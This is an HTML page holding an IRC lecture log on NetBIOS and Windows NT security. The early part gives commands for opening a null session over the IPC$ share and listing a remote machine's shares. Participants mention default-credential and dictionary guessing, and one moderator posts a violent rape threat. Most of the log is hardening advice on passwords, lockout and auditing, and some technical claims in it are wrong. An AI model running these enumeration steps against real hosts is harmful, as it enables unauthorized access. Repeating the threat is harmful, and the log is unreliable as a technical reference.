@@ -1,0 +1,1255 @@
+<html>
+<head>
+<title>Networking and NT Security Issues</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+</head>
+
+<body bgcolor="#000000" text="#ffffff" link="#ffffff" vlink="#ffffff">
+<div align="center"> 
+  <table width="680" border="0" cellspacing="2" cellpadding="2" align="center">
+    <tr> 
+      <td width="693"> 
+        <pre>
+                        :::::::::   ::::::::  :::::::::  ::::::::::
+                        :+:    :+: :+:    :+: :+:    :+: :+:
+                        +:+    +:+ +:+        +:+    +:+ +:+
+                        +#++:++#+  +#++:++#++ +#++:++#:  :#::+::#
+                        +#+    +#+        +#+ +#+    +#+ +#+
+                        #+#    #+# #+#    #+# #+#    #+# #+#
+                        #########   ########  ###    ### ###
+
+              	             <a href="http://blacksun.box.sk" target="_blank">http://blacksun.box.sk</a>
+                           _____________________________
+    ______________________I       <b>   Topic:</b>             I_____________________
+   \                      I                             I                    /
+    \     HTML by:        I     <b>Networking and NT</b>       I   Written by:     /
+    >                     I      <b>Security Issues</b>        I                  <
+   /      <a href="mailto:black_mesa@hacktik.org">Martin L.</a>       I_____________________________I   <i>&lt;log-file&gt;</i>      \
+  /___________________________>                    <_________________________\</pre>
+      </td>
+    </tr>
+  </table>
+<p>&nbsp;</p></div>
+<p><font color="#ff0000">====[ START ]=====</font></p>
+<p><b>&lt;Cypher&gt;</b> ============== Networking and NT Security Issues =================<br>
+  <b>&lt;Cypher&gt;</b> first things first, so i'll start with a little story about NetBIOS,
+  oki?<br>
+  <b>&lt;m0ded&gt;</b> k go<br>
+  <b>&lt;Cypher&gt;</b> as probably most of u know NetBIOS (aka Network Input/Output
+  System) was originally developed to be<br>
+  <b>&lt;Cypher&gt;</b> an API (app programming interface)<br>
+  <b>&lt;Cypher&gt;</b> for the client (software) to be able to use and access resources
+  of the LAN<br>
+  <b>&lt;Cypher&gt;</b> actually, NetBIOS is the interface for accessing networking services<br>
+  <b>&lt;Cypher&gt;</b> its a software (layer) to connect a network system with the hardware<br>
+  <b>&lt;Cypher&gt;</b> computers on a NetBIOS-compatible LAN talk to each other by establishing
+  a session, a NetBIOS session, or by<br>
+  <b>&lt;Cypher&gt;</b> datagrams or broadcasting methods<br>
+  <b>&lt;Cypher&gt;</b> questions so far?<br>
+  <b>&lt;Sub&gt;</b> no<br>
+  <b>&lt;QX-Mat&gt;</b> .<br>
+  <b>&lt;m0ded&gt;</b> go on<br>
+  <b>&lt;Freezer&gt;</b> nope<br>
+  <b>&lt;Cypher&gt;</b> ok<br>
+  <b>&lt;Cypher&gt;</b> there is a thing in NT called the IPC<br>
+  <font color="#ff0000">*** DR_CooL has joined #bsrf</font><br>
+  <b>&lt;Cypher&gt;</b> which is an &quot;InterProcess Communication&quot;<br>
+  <b>&lt;Cypher&gt;</b> used for Server-to-Server communications<br>
+  <b>&lt;Cypher&gt;</b> this is actually a default NT share<br>
+  <font color="#ff0000">*** TTT has joined #bsrf</font><br>
+  <b>&lt;Cypher&gt;</b> hey DR_CooL, TTT<br>
+  <b>&lt;m0ded&gt;</b> a hidden NT share?<br>
+  <b>&lt;Olaf&gt;</b> Hi TTT<br>
+  <b>&lt;TTT&gt;</b> Hi, cypher!<br>
+  <b>&lt;Cypher&gt;</b> m0ded, yes kinda<br>
+  <b>&lt;TTT&gt;</b> You already started?<br>
+  <font color="#ff0000">*** elad sets mode: +m</font><br>
+  <font color="#ff0000">*** elad sets mode: +v Cypher</font><br>
+  <b>&lt;elad&gt;</b> now lecture.<br>
+  <b>&lt;Cypher&gt;</b> :)<br>
+  <font color="#ff0000">*** elad sets mode: +o Cypher</font><br>
+  <font color="#ff0000">*** ChanServ sets mode: -o Cypher</font><br>
+  <b>&lt;Cypher&gt;</b> so<br>
+  <b>&lt;Cypher&gt;</b> anyhow, the IPC is a hidden NT share, as m0ded sayed<br>
+  <font color="#ff0000">*** elad sets mode: -m</font><br>
+  <b>&lt;DR_CooL&gt;</b> that's better<br>
+  <b>&lt;Cypher&gt;</b> a malicious ;-) user could connect to it<br>
+  <b>&lt;Cypher&gt;</b> and gather information about the system<br>
+  <b>&lt;Cypher&gt;</b> this is done by an NT command (yep, microsoft gave us that)<br>
+  <b>&lt;Cypher&gt;</b> the NBTSTAT command<br>
+  <b>&lt;Cypher&gt;</b> it establishes a NULL Session (no credentials required) to the
+  targer system<br>
+  <b>&lt;Cypher&gt;</b> target<br>
+  <b>&lt;Cypher&gt;</b> its syntax is simple (from the prompt of course):<br>
+  <b>&lt;Cypher&gt;</b> nbtstat -a 123.123.123.123<br>
+  <b>&lt;Cypher&gt;</b> nbtstat -a &lt;IP&gt;<br>
+  <font color="#ff0000">*** _sniper_on_moon- has joined #bsrf</font><br>
+  <b>&lt;Cypher&gt;</b> by using this command u'll get the ....wait... let me quote this<br>
+  <b>&lt;DR_CooL&gt;</b> and what indormation does it give ?<br>
+  <b>&lt;Cypher&gt;</b> &quot;NetBIOS Remote Machine Name Table&quot;<br>
+  <b>&lt;Cypher&gt;</b> this is actually the first step to gathering information the
+  remote machine<br>
+  <b>&lt;Cypher&gt;</b> and, btw, i didn't mention this before, but info gathering is
+  about 60% (if not more) of the job<br>
+  <font color="#ff0000">*** FrEEkY[cooking] is now known as FrEEkY</font><br>
+  <b>&lt;Cypher&gt;</b> now lets try to establish that NUll session<br>
+  <b>&lt;Cypher&gt;</b> there is another &quot;kewl&quot; command<br>
+  <b>&lt;Cypher&gt;</b> the &quot;net&quot; command<br>
+  <b>&lt;Sub&gt;</b> net use<br>
+  <b>&lt;m0ded&gt;</b> use is a parameter<br>
+  <b>&lt;Cypher&gt;</b> yep<br>
+  <b>&lt;Cypher&gt;</b> it has many useful features (read the manual) but we'll mostly
+  focus on &quot;net use&quot; and &quot;net view&quot;<br>
+  <b>&lt;Cypher&gt;</b> net view lets us see the<br>
+  <b>&lt;Cypher&gt;</b> shares on the machine (depending on its security policy of course)<br>
+  <b>&lt;Cypher&gt;</b> net view \\IP_ADDRESS might get us ether the shares or the &quot;Access
+  is denied&quot; msg<br>
+  <b>&lt;Cypher&gt;</b> if it gives us the shares, then...well... this part is done<br>
+  <b>&lt;Cypher&gt;</b> but if not<br>
+  <b>&lt;Cypher&gt;</b> we will try the next thing:<br>
+  <b>&lt;Cypher&gt;</b> net use \\IP_ADDRESS\ipc$ &quot;&quot; /user:&quot;&quot;<br>
+  <b>&lt;Cypher&gt;</b> which means, connect to the IPC share (ipc$ - the default share)
+  with a &quot;&quot; (blank) password<br>
+  <b>&lt;Cypher&gt;</b> and with the &quot;&quot; (blank) user name<br>
+  <b>&lt;TTT&gt;</b> and now?<br>
+  <b>&lt;Cypher&gt;</b> as i said, the IPC needs no credentials<br>
+  <b>&lt;Cypher&gt;</b> if we get the &quot;The Command completed successfully&quot;
+  msg<br>
+  <b>&lt;Cypher&gt;</b> then we have established the null session and now we can get
+  that list of shares<br>
+  <b>&lt;Cypher&gt;</b> meaning issue the &quot;net view \\IP&quot; command<br>
+  <b>&lt;Cypher&gt;</b> so, actually the list of shares is usually unavailable until
+  u establish the null session<br>
+  <b>&lt;Cypher&gt;</b> questions?<br>
+  <b>&lt;m0ded&gt;</b> yeah<br>
+  <b>&lt;Sub&gt;</b> can you establish a null session any other way?<br>
+  <b>&lt;m0ded&gt;</b> what u mean a null session?<br>
+  <font color="#ff0000">*** TTT has joined #bsrf</font><br>
+  <b>&lt;_zach-&gt</b>; where no credntilas are required<br>
+  <b>&lt;_zach-&gt</b>; from you<br>
+  <font color="#ff0000">*** Esamurai has joined #bsrf</font><br>
+  <b>&lt;Cypher&gt;</b> Sub, the null session can be established by the built-in &quot;net
+  use&quot; command or any other &quot;null session establishment&quot; tools
+  (there are plenty)<br>
+  <b>&lt;_zach-&gt</b>; to conenct<br>
+  <b>&lt;FrEEkY&gt;</b> I have an addition<br>
+  <b>&lt;_zach-&gt</b>; to the target<br>
+  <b>&lt;Cypher&gt;</b> m0ded, null session<br>
+  <b>&lt;Cypher&gt;</b> right zach<br>
+  <b>&lt;_zach-&gt</b>; :)<br>
+  <b>&lt;Cypher&gt;</b> m0ded answer = zach<br>
+  <b>&lt;FrEEkY&gt;</b> if you turn your filesharing on and then after your in you turn
+  it off, it can get the neccesary files on your computer to mask you as a part
+  of the network<br>
+  <b>&lt;Cypher&gt;</b> its a connection throught the IPC share<br>
+  <b>&lt;_zach-&gt</b>; w00t<br>
+  <b>&lt;Sub&gt;</b> so, what packets would you have to send to establish a null session,
+  if you were coding an exploit for instance?<br>
+  <b>&lt;Cypher&gt;</b> Sub, i haven't actually tryed &quot;raw&quot; connection to ipc
+  yet...<br>
+  <b>&lt;tcg&gt;</b> whats an ipc share<br>
+  <b>&lt;Cypher&gt;</b> tcg, its a default (hidden) NT share (one of them, at least)<br>
+  <b>&lt;QX-Mat&gt;</b> Can we carry on?<br>
+  <b>&lt;Cypher&gt;</b> QX-Mat, of course<br>
+  <font color="#ff0000">*** DR_CooL has quit IRC (Ping timeout)</font><br>
+  <font color="#ff0000">*** _sniper_on_moon- is now known as sniper</font><br>
+  <b>&lt;TTT&gt;</b> Has anyone a log from beginning of the lesson?<br>
+  <b>&lt;m0ded&gt;</b> yes me<br>
+  <b>&lt;Sub&gt;</b> me<br>
+  <b>&lt;FrEEkY&gt;</b> I do<br>
+  <b>&lt;Cypher&gt;</b> lets now move to a bit different direction - securing NT<br>
+  <b>&lt;tcg&gt;</b> why nt got that?<br>
+  <b>&lt;TTT&gt;</b> okay<br>
+  <b>&lt;Cypher&gt;</b> tcg, inner communications</font><br>
+  <font color="#ff0000">*** Samcon has joined #bsrf</font><br>
+  <b>&lt;Cypher&gt;</b> now, the basic steps/checklist<br>
+  <b>&lt;tcg&gt;</b> what is it good for?<br>
+  <b>&lt;Cypher&gt;</b> to &quot;start&quot; securing an NT machine<br>
+  <b>&lt;FrEEkY&gt;</b> securing an NT machine, orignall idea<br>
+  <b>&lt;QX-Mat&gt;</b> )<br>
+  <b>&lt;Cypher&gt;</b> first thing, and the obvious one<br>
+  <b>&lt;Cypher&gt;</b> is Passwords<br>
+  <b>&lt;Cypher&gt;</b> (duh) ;)<br>
+  <b>&lt;Cypher&gt;</b> unfortunatly, many admins neglect password policies, for some
+  reason<br>
+  <b>&lt;dr3x&gt;</b> min_password_length = 12 :)<br>
+  <b>&lt;tcg&gt;</b> but I can't telnet an nt box<br>
+  <b>&lt;tcg&gt;</b> so who cares<br>
+  <b>&lt;Cypher&gt;</b> putting passwords, such as &quot;john&quot; on a &quot;john&quot;
+  user account<br>
+  <b>&lt;Sub&gt;</b> tcg: there is a telnetd for NT<br>
+  <b>&lt;Cypher&gt;</b> dr3x, good, but can the &quot;dumb&quot; user remember it?<br>
+  <b>&lt;tcg&gt;</b> password guessing is out of fashion<br>
+  <b>&lt;elad&gt;</b> tcg; you can install some ssh server and ssh to it, yeah :)<br>
+  <b>&lt;dr3x&gt;</b> nope<br>
+  <b>&lt;elad&gt;</b> why would a sane person want to use telnet? :)<br>
+  <b>&lt;tcg&gt;</b> haha<br>
+  <font color="#ff0000">*** sniper has quit IRC (Ping timeout)</font><br>
+  <b>&lt;TTT&gt;</b> you can do interesting things with telnet, which you can't do with
+  ssh<br>
+  <b>&lt;FrEEkY&gt;</b> tcg: you can get into NBTSTAT in a whole other way, to get info
+  on the computer so you can access it better with telnet<br>
+  <b>&lt;elad&gt;</b> hahahha!<br>
+  <b>&lt;elad&gt;</b> ok lets let cypher go on with his lecture<br>
+  <b>&lt;Olaf&gt;</b> whith telnet we can do everything!!!<br>
+  <b>&lt;Cypher&gt;</b> good idea, elad...<br>
+  <b>&lt;QX-Mat&gt;</b> Olaf: true!<br>
+  <b>&lt;Cypher&gt;</b> shall we continue??<br>
+  <b>&lt;Sub&gt;</b> yes<br>
+  <b>&lt;m0ded&gt;</b> yeah<br>
+  <b>&lt;Slayer[reading_eating]&gt;</b> yes<br>
+  <b>&lt;m0ded&gt;</b> <b>&lt;Cypher&gt;</b> putting passwords, such as &quot;john&quot; on
+  a &quot;john&quot; user account<br>
+  <b>&lt;tcg&gt;</b> say<br>
+  <b>&lt;Cypher&gt;</b> so obviously, the admin has to put proper password policies,
+  which include (mostly):<br>
+  <b>&lt;tcg&gt;</b> a password that is like the username isn't good right?<br>
+  <b>&lt;Cypher&gt;</b> tcg, yeah :)<br>
+  <b>&lt;Cypher&gt;</b> password age:<br>
+  <b>&lt;tcg&gt;</b> ??<br>
+  <b>&lt;Cypher&gt;</b> the amount of time the password remains valid<br>
+  <b>&lt;Cypher&gt;</b> this is sometimes not set, or disabled on some accounts<br>
+  <b>&lt;FrEEkY&gt;</b> I've never thought of microsoft passwords as being a problem
+  <br>
+  <b>&lt;Cypher&gt;</b> causing one password to last &quot;a lifetime&quot;<br>
+  <b>&lt;Cypher&gt;</b> so its better to put a password age as something about 30 days<br>
+  <b>&lt;tcg&gt;</b> all these stuff are right both for nt4 and win2k?<br>
+  <b>&lt;Cypher&gt;</b> tcg, yes<br>
+  <b>&lt;tcg&gt;</b> my password is complex. its my username backwards. :)<br>
+  <b>&lt;tcg&gt;</b> and nt3.51?<br>
+  <b>&lt;Olaf&gt;</b> I'm using a secure unix which acepts guest!!!!<br>
+  <b>&lt;_zach-&gt</b>; ./dns Olaf<br>
+  <b>&lt;_zach-&gt</b>; lol<br>
+  <b>&lt;m0ded&gt;</b> heh<br>
+  <b>&lt;elad&gt;</b> like<br>
+  <b>&lt;Slayer[reading_eating]&gt;</b> :)<br>
+  <b>&lt;elad&gt;</b> shut the fuck up and let him get to the questions part<br>
+  <b>&lt;elad&gt;</b> or i will rape your mothers<br>
+  <b>&lt;tcg&gt;</b> hahaha<br>
+  <b>&lt;elad&gt;</b> to death<br>
+  <b>&lt;Cypher&gt;</b> besides the password also has to be good, meaning a combination
+  of letters, symbols, and numbers<br>
+  <b>&lt;tcg&gt;</b> again, I love your stylw<br>
+  <b>&lt;tcg&gt;</b> style, rather<br>
+  <b>&lt;Samcon&gt;</b> :)<br>
+  <b>&lt;tcg&gt;</b> man<br>
+  <b>&lt;tcg&gt;</b> noone guess passwords today<br>
+  <b>&lt;Cypher&gt;</b> that's it for passwords<br>
+  <b>&lt;TTT&gt;</b> There is a simple way to get a good password:<br>
+  <b>&lt;Cypher&gt;</b> questions? (elad?)<br>
+  <b>&lt;TTT&gt;</b> Take a phrase you remember always<br>
+  <b>&lt;TTT&gt;</b> e.g.<br>
+  <b>&lt;elad&gt;</b> yeah<br>
+  <font color="#ff0000">*** Rockin_lad has joined #bsrf</font><br>
+  <b>&lt;TTT&gt;</b> The Matrix is a great Movie<br>
+  <font color="#ff0000">*** _zach- has quit IRC (Quit: yyhythythtnnt)</font><br>
+  <b>&lt;elad&gt;</b> who is the real slim shady?<br>
+  <b>&lt;TTT&gt;</b> then take every first letter<br>
+  <b>&lt;TTT&gt;</b> and put it together<br>
+  <b>&lt;Cypher&gt;</b> elad, u?! ;)<br>
+  <b>&lt;TTT&gt;</b> so you got a good &quot;base&quot; for a password<br>
+  <b>&lt;TTT&gt;</b> and you remember it always<br>
+  <b>&lt;elad&gt;</b> tmiagm is a bad password<br>
+  <b>&lt;Samcon&gt;</b> this has a real connection to the lecture<br>
+  <b>&lt;TTT&gt;</b> as I said, it is a base<br>
+  <b>&lt;m0ded&gt;</b> aaa is worse<br>
+  <b>&lt;Rockin_lad&gt;</b> Hello room <br>
+  <b>&lt;Rockin_lad&gt;</b> am I late ?<br>
+  <b>&lt;Sub&gt;</b> yes<br>
+  <b>&lt;m0ded&gt;</b> yeah u are<br>
+  <b>&lt;Cypher&gt;</b> anyhow, if there are no more questions, lets continue<br>
+  <b>&lt;Cypher&gt;</b> hey rockin_lad, a bit, yes<br>
+  <b>&lt;Rockin_lad&gt;</b> oh shit <br>
+  <b>&lt;QX-Mat&gt;</b> I have a question<br>
+  <b>&lt;Slayer[reading_eating]&gt;</b> me too<br>
+  <b>&lt;Rockin_lad&gt;</b> damn analog dialups<br>
+  <b>&lt;Cypher&gt;</b> shoot, QX-Mat, Slayer<br>
+  <b>&lt;QX-Mat&gt;</b> When calculating user ages under NT, what is the age set from
+  (enum_xxxx_xxxx etc)<br>
+  <b>&lt;elad&gt;</b> ok i'm out<br>
+  <b>&lt;tcg&gt;</b> ;\<br>
+  <font color="#ff0000">*** _sniper- has joined #bsrf</font><br>
+  <font color="#ff0000">*** _sniper- is now known as sniper</font><br>
+  <b>&lt;Slayer[reading_eating]&gt;</b> the only way to crack the share pass is brute
+  force?<br>
+  <b>&lt;Cypher&gt;</b> QX-Mat, user age? i'm not following....<br>
+  <font color="#ff0000">*** SpiderMan has joined #bsrf</font><br>
+  <b>&lt;Sub&gt;</b> i gotta go<br>
+  <b>&lt;TTT&gt;</b> Hi, spider!<br>
+  <b>&lt;QX-Mat&gt;</b> Never mind<br>
+  <b>&lt;SpiderMan&gt;</b> hi<br>
+  <b>&lt;Sub&gt;</b> cya all<br>
+  <b>&lt;Cypher&gt;</b> Slayer, no, u could also try a dictionary attack<br>
+  <font color="#ff0000">*** Sub has quit IRC (Quit: gone)</font><br>
+  <b>&lt;QX-Mat&gt;</b> I say later with more info<br>
+  <b>&lt;SpiderMan&gt;</b> wow there are a lot of people here, is there a lecture?<br>
+  <b>&lt;m0ded&gt;</b> yeah god damniut<br>
+  <b>&lt;TTT&gt;</b> jep, spider<br>
+  <b>&lt;Samcon&gt;</b> yep<br>
+  <b>&lt;m0ded&gt;</b> shut up<br>
+  <b>&lt;Cypher&gt;</b> lets continue<br>
+  <b>&lt;TTT&gt;</b> NT-Security<br>
+  <b>&lt;Slayer[reading_eating]&gt;</b> yeah i now is there any other way then guess
+  attacks<br>
+  <b>&lt;Cypher&gt;</b> next issue - Permissions<br>
+  <b>&lt;Rockin_lad&gt;</b> bye<br>
+  <b>&lt;Cypher&gt;</b> organize them! there is no purpose of giving everyone access
+  to all directories...<br>
+  <font color="#ff0000">*** Olaf has quit IRC (Ping timeout)</font><br>
+  <b>&lt;Cypher&gt;</b> keep users to their home dirs, and don't let them browse away<br>
+  <b>&lt;m0ded&gt;</b> Read-Only<br>
+  <b>&lt;Rockin_lad&gt;</b> registry maybe ?!<br>
+  <b>&lt;Rockin_lad&gt;</b> take the encryped password and decrypt it , would that work
+  ?<br>
+  <b>&lt;Slayer[reading_eating]&gt;</b> i guess no<br>
+  <b>&lt;Cypher&gt;</b> Rockin_lad, u cannot decrypt passwords<br>
+  <b>&lt;Cypher&gt;</b> they use assimetric functions - one-way<br>
+  <b>&lt;tcg&gt;</b> 1 way encryption<br>
+  <b>&lt;tcg&gt;</b> ;\<br>
+  <b>&lt;tcg&gt;</b> bbl<br>
+  <b>&lt;Cypher&gt;</b> next - The Administrator account<br>
+  <b>&lt;Rockin_lad&gt;</b> no , I just guessd , I think they have programs for that<br>
+  <b>&lt;Cypher&gt;</b> Rockin_lad, they do something else<br>
+  <b>&lt;Cypher&gt;</b> not decryption<br>
+  <b>&lt;Cypher&gt;</b> which is, sadly, a built-in NT account u have no way of deleting.
+  but u can rename it.....<br>
+  <b>&lt;Cypher&gt;</b> now, what good will a rename do?<br>
+  <b>&lt;tcg&gt;</b> people wont guess it ;\<br>
+  <b>&lt;Cypher&gt;</b> and the default password is &lt;blank&gt;, btw....<br>
+  <b>&lt;dr3x&gt;</b> evil script kiddies wont know what account to h4x0r<br>
+  <b>&lt;Cypher&gt;</b> right :) although this sound to simple, most ppl first try
+  the Administrator:&lt;blank&gt; and Guest:Guest combinations<br>
+  <font color="#ff0000">*** Slayer[reading_eating] is now known as Slayer</font><br>
+  <font color="#ff0000">*** sanke has joined #bsrf</font><br>
+  <b>&lt;dr3x&gt;</b> I know i do!<br>
+  <b>&lt;Cypher&gt;</b> so that rename will stop most script kiddies<br>
+  <b>&lt;dr3x&gt;</b> (oops)<br>
+  <b>&lt;Cypher&gt;</b> hehe :)<br>
+  <b>&lt;sanke&gt;</b> Hey Qx<br>
+  <b>&lt;Cypher&gt;</b> which just seek the net for &quot;test-my-kEwL-haX0r-skilZ&quot;
+  purposes and have no intention for your system, specifically<br>
+  <font color="#ff0000">*** snider has joined #bsrf</font><br>
+  <font color="#ff0000">*** sniper has quit IRC (Ping timeout)</font><br>
+  <b>&lt;snider&gt;</b> [19:37] [snider PING reply]: 41secs ............shit<br>
+  <b>&lt;Cypher&gt;</b> so a fair solution is to rename that account and password it.<br>
+  <b>&lt;Cypher&gt;</b> then create another account, named Administrator, but with absolutely
+  NO permittions<br>
+  <b>&lt;dr3x&gt;</b> honey pot?<br>
+  <b>&lt;Cypher&gt;</b> that's another anti-script-kiddie countermeasure<br>
+  <b>&lt;TTT&gt;</b> dr3x, no<br>
+  <b>&lt;Cypher&gt;</b> dr3x, kinda yeah :)<br>
+  <b>&lt;dr3x&gt;</b> cant you set the Administrator account to set off all sorts of
+  alarms?<br>
+  <b>&lt;TTT&gt;</b> A honeypot would act more aggressive, does it?<br>
+  <b>&lt;Rockin_lad&gt;</b> correct me if I'm wrong , but aint the pass file supposed
+  to somewhere under HKWEY_LOCAL_MACHINE/SAM OR SOMETHING ?<br>
+  <b>&lt;dr3x&gt;</b> thatd make sense<br>
+  <b>&lt;Cypher&gt;</b> besides, u could audit and see when someone tryes to access that
+  account.... and KILL KILL KILL :)<br>
+  <b>&lt;dr3x&gt;</b> yeah,<br>
+  <b>&lt;Cypher&gt;</b> dr3x, u can write on-logon scripts<br>
+  <b>&lt;Cypher&gt;</b> rockin_lad, yes<br>
+  <b>&lt;Cypher&gt;</b> we'll get to that<br>
+  <b>&lt;Rockin_lad&gt;</b> k<br>
+  <font color="#ff0000">*** _zach- has joined #bsrf</font><br>
+  <b>&lt;Cypher&gt;</b> of and btw, u also should set a real good password: something
+  like - &quot;try_and_hax0r_me_u_dumbas&quot; ;-) so he won't have it easy<br>
+  <b>&lt;Cypher&gt;</b> getting your &quot;zero permittions&quot; account also :)<br>
+  <b>&lt;dr3x&gt;</b> hehehe<br>
+  <b>&lt;Cypher&gt;</b> question time<br>
+  <b>&lt;QX-Mat&gt;</b> me<br>
+  <font color="#ff0000">*** tcg has quit IRC (Quit: ircII EPIC4-0.9.1 -- Accept no limitations)</font><br>
+  <b>&lt;QX-Mat&gt;</b> Back with that thing earlier<br>
+  <b>&lt;QX-Mat&gt;</b> For example: <br>
+  <b>&lt;QX-Mat&gt;</b> # Win32-NT :)<br>
+  <b>&lt;QX-Mat&gt;</b> use Win32::NetAdmin;<br>
+  <b>&lt;QX-Mat&gt;</b> UserGetAttributes(&quot;&quot;, $_, $password, $passwordAge,
+  $privilege, $homeDir, $comment, $flags, $scriptPath)<br>
+  <b>&lt;QX-Mat&gt;</b> <br>
+  <b>&lt;QX-Mat&gt;</b> The user/password age is a number, but this number is not the
+  seconds since the passwords was<br>
+  <b>&lt;QX-Mat&gt;</b> activated, but the seconds (or days/minuets?) from 1980 sometime
+  untill the password was created<br>
+  <b>&lt;QX-Mat&gt;</b> plus the actual age.<br>
+  <b>&lt;QX-Mat&gt;</b> Ex: 1980 to today is 20 years + say 1 since the user made their
+  password, then you do<br>
+  <b>&lt;QX-Mat&gt;</b> (((((21*365)+5)*24)*60)*60), but I'm<br>
+  <b>&lt;QX-Mat&gt;</b> not sure of the exact date in 1980?<br>
+  <font color="#ff0000">*** ZipIt has joined #bsrf</font><br>
+  <b>&lt;Cypher&gt;</b> are u asking what password age is measured in? days i believe....<br>
+  <b>&lt;QX-Mat&gt;</b> yes, but from?<br>
+  <b>&lt;Cypher&gt;</b> its the time since the password was set<br>
+  <b>&lt;Cypher&gt;</b> or changed, of course<br>
+  <b>&lt;QX-Mat&gt;</b> That's not how it works out of.... and I did read it was set
+  from a data in the 80's<br>
+  <font color="#ff0000">*** wallk has joined #bsrf</font><br>
+  <b>&lt;Cypher&gt;</b> perhaps in nt3.51? or did u read about nt4/5?<br>
+  <b>&lt;QX-Mat&gt;</b> same, user attributes are the same...<br>
+  <font color="#ff0000">*** ZipIt has quit IRC (Killed (NickServ (GHOST command used by wallk)))</font><br>
+  <font color="#ff0000">*** wallk is now known as zipit</font><br>
+  <b>&lt;QX-Mat&gt;</b> it was because of Nt 3.51 though<br>
+  <font color="#ff0000">*** zipit is now known as ZipIt</font><br>
+  <b>&lt;Cypher&gt;</b> i'll check that out, can't give u a full answer now<br>
+  <b>&lt;QX-Mat&gt;</b> ok<br>
+  <b>&lt;Cypher&gt;</b> its a novice lecture, after all :)<br>
+  <b>&lt;ZipIt&gt;</b> Hello all#<br>
+  <b>&lt;Cypher&gt;</b> lets continue then<br>
+  <b>&lt;Cypher&gt;</b> hey ZipIt<br>
+  <b>&lt;Cypher&gt;</b> next issue of the day is - Lockout and Audit policies<br>
+  <b>&lt;Rockin_lad&gt;</b> will be covering , Microfosf Exchange ?<br>
+  <b>&lt;Cypher&gt;</b> if there is a thing users hate is complex passwords and lockouts<br>
+  <b>&lt;Cypher&gt;</b> no<br>
+  <b>&lt;Rockin_lad&gt;</b> oh , okay then <br>
+  <b>&lt;Cypher&gt;</b> but as an admin, u _must_ set a complex passwords and a lockout
+  policy<br>
+  <b>&lt;Rockin_lad&gt;</b> lockout ?!<br>
+  <b>&lt;Cypher&gt;</b> (therefor being hated by the users) :)<br>
+  <b>&lt;Rockin_lad&gt;</b> he he<br>
+  <b>&lt;Cypher&gt;</b> Lockout means that the system locks up after a certain number<br>
+  <b>&lt;ZipIt&gt;</b> But what a user wants is not always the best thing...<br>
+  <b>&lt;Cypher&gt;</b> of invalid login attempts<br>
+  <font color="#ff0000">*** sanke has quit IRC (Ping timeout)</font><br>
+  <b>&lt;Rockin_lad&gt;</b> oh I see , <br>
+  <b>&lt;Samcon&gt;</b> screw the users<br>
+  <b>&lt;Cypher&gt;</b> ZipIt, absolutelly correct!<br>
+  <font color="#ff0000">*** Olaf has joined #bsrf</font><br>
+  <b>&lt;Cypher&gt;</b> i recommend setting the invalid attemps to 3 or 5, and the lockout
+  time to about 10 minutes (or more, if u desire)<br>
+  <b>&lt;Cypher&gt;</b> that's actually the time in which the user cannot try any logins<br>
+  <b>&lt;Cypher&gt;</b> (also an anti-script-kiddie countermeasure)<br>
+  <font color="#ff0000">*** _quato_ has joined #bsrf</font><br>
+  <b>&lt;Cypher&gt;</b> if he tryes 3 or even 5 attemps and then looses connection he'll
+  just (usually) backaway<br>
+  <b>&lt;_quato_&gt;</b> greetings<br>
+  <b>&lt;ZipIt&gt;</b> Cypher - What about Auditing failed attemps<br>
+  <b>&lt;ZipIt&gt;</b> ?<br>
+  <b>&lt;Cypher&gt;</b> getting to it now :)<br>
+  <b>&lt;ZipIt&gt;</b> soz<br>
+  <b>&lt;Cypher&gt;</b> Auditing is another _very_ important issue in sec.<br>
+  <b>&lt;_caps&gt;</b> was just reading the logs.., about setting a &quot;lifetime&quot;
+  for passwords, that isn't a real good idea if you are running a big network
+  that has to be dynamic<br>
+  <b>&lt;Cypher&gt;</b> its help u see all those invalid logins or ever successfull ones<br>
+  <b>&lt;_caps&gt;</b> users can't always check for new passwords<br>
+  <b>&lt;Cypher&gt;</b> _caps, but imagine someone gets one &quot;unlimited&quot; password.....<br>
+  <b>&lt;QX-Mat&gt;</b> my neighbors on BBC2<br>
+  <b>&lt;Cypher&gt;</b> save that to the questions time (soon to be) plz<br>
+  <font color="#ff0000">*** Sub has joined #bsrf</font><br>
+  <b>&lt;ZipIt&gt;</b> But if there's 1 thing Admin's hate... and thats &quot;wading&quot;
+  through MB's of Audit logs<br>
+  <b>&lt;Cypher&gt;</b> Auditing lets u monitor all sorts of security related activity
+  on your machine/network<br>
+  <b>&lt;_quato_&gt;</b> greetings Samcon<br>
+  <b>&lt;_caps&gt;</b> okay :) was just reading logs and thought i'll note on that.<br>
+  <b>&lt;Cypher&gt;</b> ZipIt, normal admins, just hate logs :)<br>
+  <b>&lt;ZipIt&gt;</b> lol<br>
+  <b>&lt;Cypher&gt;</b> but they use and read them, anyhow :)<br>
+  <b>&lt;_zach-&gt</b>; some..<br>
+  <b>&lt;_zach-&gt</b>; :)<br>
+  <b>&lt;Cypher&gt;</b> so the conclusion is - read your logs!!! don't underestimate
+  the great power of the written word! ;-)<br>
+  <b>&lt;Samcon&gt;</b> ?<br>
+  <b>&lt;Cypher&gt;</b> now - before i move to NTFS - questions<br>
+  <font color="#ff0000">*** sniper has joined #bsrf</font><br>
+  <font color="#ff0000">*** sniper has quit IRC (Quit: plec la mama acasa !!! :))))</font><br>
+  <font color="#ff0000">*** snider has quit IRC (Ping timeout)</font><br>
+  <b>&lt;Cypher&gt;</b> anyone?<br>
+  <b>&lt;QX-Mat&gt;</b> With Win32::EventLog, you can make perl cypher though to check
+  for &quot;naughty&quot; things<br>
+  <font color="#ff0000">*** DigitalFallout has joined #bsrf</font><br>
+  <font color="#ff0000">*** Samcon has quit IRC (Quit: Women, You can't dig them and you can't dig them
+  a grave)</font><br>
+  <b>&lt;QX-Mat&gt;</b> Handy to track down what the school admin did wrong<br>
+  <b>&lt;QX-Mat&gt;</b> ;)<br>
+  <b>&lt;Cypher&gt;</b> QX-Mat, there are many log analyzers out there<br>
+  <font color="#ff0000">*** blindman`s_vision has joined #bsrf</font><br>
+  <b>&lt;Cypher&gt;</b> getting one would usually be a good idea<br>
+  <font color="#ff0000">*** snider has joined #bsrf</font><br>
+  <b>&lt;DigitalFallout&gt;</b> Hey all<br>
+  <b>&lt;ZipIt&gt;</b> What types of information do you (personally) audit...<br>
+  <b>&lt;Rockin_lad&gt;</b> me<br>
+  <b>&lt;Rockin_lad&gt;</b> but I think I'll ask it later , it may ne out of subject<br>
+  <b>&lt;QX-Mat&gt;</b> regex will meet your needs though<br>
+  <b>&lt;Cypher&gt;</b> hey blindman`s_vision, wb snider<br>
